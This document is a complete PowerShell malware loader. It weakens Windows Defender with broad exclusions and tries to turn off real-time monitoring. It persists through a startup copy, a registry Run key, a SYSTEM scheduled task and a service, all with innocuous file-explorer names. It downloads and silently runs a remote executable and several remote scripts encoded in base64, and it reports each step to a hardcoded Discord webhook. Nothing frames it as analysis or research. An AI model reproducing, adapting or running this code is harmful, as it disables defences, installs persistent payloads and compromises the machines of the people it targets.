$WebhookURL = "https://discord.com/api/webhooks/1442924485698392219/Vz4aoPFbx2IaVvT0SRJt5I2IKGd_RXg-fDgy69gkUVdKDvRSkFL_nPE0sRB_E3QTEUxD"
$FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
$LaunchDelay   = 1
$WindowStyle   = "Hidden"
$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileExplorer.ps1"
$StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$TaskName       = "FileExplorerTask"
$ServiceName    = "FileGuardianService"

function Send-DiscordLog {
    param([string]$Message)
    try {
        $formattedMessage = "$Message"
        $body = @{content = $formattedMessage} | ConvertTo-Json -Depth 10
        Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
    }
    catch {
    }
}

function Set-Exclusions {
    try {
        # Exclude all important folders: AppData, LocalAppData, ProgramFiles (covers random download locations)
        $importantFolders = @(
            $env:APPDATA,
            $env:LOCALAPPDATA,
            $env:ProgramFiles,
            "${env:ProgramFiles(x86)}"  # 32-bit Program Files if it exists
        )
        foreach ($folder in $importantFolders) {
            if (Test-Path $folder) {
                Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
            }
        }
        
        # Exclude all subfolders recursively in AppData (ensures all EXEs and files in any subfolder are excluded)
        $appdataSubfolders = Get-ChildItem -Path $env:APPDATA -Directory -Recurse -ErrorAction SilentlyContinue
        foreach ($subfolder in $appdataSubfolders) {
            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
        }
        $localappdataSubfolders = Get-ChildItem -Path $env:LOCALAPPDATA -Directory -Recurse -ErrorAction SilentlyContinue
        foreach ($subfolder in $localappdataSubfolders) {
            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
        }
        
        # Exclude the startup script path and any potential payload paths
        Add-MpPreference -ExclusionPath $StartupScriptPath -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue  # Temp folder as fallback
        Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue  # Downloads folder
        
        # Exclude all common file types/extensions to prevent detection of payload and related files
        $fileTypes = @(".exe", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".dll", ".scr", ".pif", ".tmp", ".log", ".txt", ".ini", ".cfg")
        foreach ($ext in $fileTypes) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        
        # Exclude processes to prevent scanning of PowerShell, CMD, etc., executions
        $processes = @("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe")
        foreach ($proc in $processes) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
        }
        
        # Disable real-time scanning temporarily if possible (requires elevated perms, but attempt)
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        
        $logMsg = "[+] All exclusions set: folders, subfolders, file types, and processes"
        Send-DiscordLog $logMsg
    }
    catch {
        $logMsg = "[!] Failed to set exclusions: $($_.Exception.Message)"
        Send-DiscordLog $logMsg
    }
}

function Set-Survival {
    try {
        if (-not (Test-Path $StartupScriptPath)) {
            if ($MyInvocation.MyCommand.Path) {
                Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
                $logMsg = "[+] Copied to startup $StartupScriptPath"
                Send-DiscordLog $logMsg
            } else {
                $logMsg = "[!] Skipping startup copy"
                Send-DiscordLog $logMsg
            }
        } else {
            $logMsg = "[+] Startup already exists $StartupScriptPath"
            Send-DiscordLog $logMsg
        }
        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
        $logMsg = "[+] Scheduled task set $TaskName"
        Send-DiscordLog $logMsg
        $serviceBinPath = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $ServiceName -BinaryPathName $serviceBinPath -StartupType Automatic -Description "File Explorer Service" | Out-Null
            Start-Service -Name $ServiceName
            $logMsg = "[+] Service created and started $ServiceName"
            Send-DiscordLog $logMsg
        } else {
            $logMsg = "[+] Service already exists $ServiceName"
            Send-DiscordLog $logMsg
        }
    }
    catch {
        $logMsg = "[!] Failed to set survival: $($_.Exception.Message)"
        Send-DiscordLog $logMsg
    }
}

function Run-Payload {
    try {
        $possibleDirectories = @(
            "$env:ProgramFiles",
            "$env:APPDATA",
            "$env:LOCALAPPDATA"
        )
        $selectedDirectory = $possibleDirectories | Get-Random
        if (-not (Test-Path $selectedDirectory)) {
            throw "Selected directory does not exist $selectedDirectory"
        }
        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
        if ($subDirectories.Count -eq 0) {
            throw "No subdirectories found in the selected directory $selectedDirectory"
        }
        $targetSubDirectory = $subDirectories | Get-Random
        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "helper.exe"
        # Explicitly exclude the target path for the downloaded payload
        Add-MpPreference -ExclusionPath $TargetPath -ErrorAction SilentlyContinue
        if (-not (Test-Path $TargetPath)) {
            $logMsg = "[*] File not found, downloading to $TargetPath..."
            Send-DiscordLog $logMsg
            Write-Host $logMsg
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }
        Start-Sleep -Seconds $LaunchDelay
        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle
        $logMsg = "[+] Executed payload $TargetPath"
        Send-DiscordLog $logMsg
        Write-Host $logMsg
    }
    catch {
        $logMsg = "[!] Failed to execute payload: $($_.Exception.Message)"
        Send-DiscordLog $logMsg
        Write-Host $logMsg
    }
}

function executeps {
    param([string]$Url)
    try {
        $scriptContent=Invoke-WebRequest -Uri $Url -UseBasicParsing|% Content
        $bytes=[System.Text.Encoding]::Unicode.GetBytes($scriptContent)
        $encoded=[Convert]::ToBase64String($bytes)
        $processArgs=@("-WindowStyle","Hidden","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded)
        Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false
        $logMsg = "[+] Launched extra script from $Url"
        Send-DiscordLog $logMsg
    }
    catch {
        $logMsg = "[!] Failed to execute script from $Url : $($_.Exception.Message)"
        Send-DiscordLog $logMsg
    }
}

# Run exclusions first to ensure payload isn't detected
Set-Exclusions
Set-Survival
Run-Payload
executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload")
executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/dreset")
executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac")
executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/exocheck")
executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/farm")
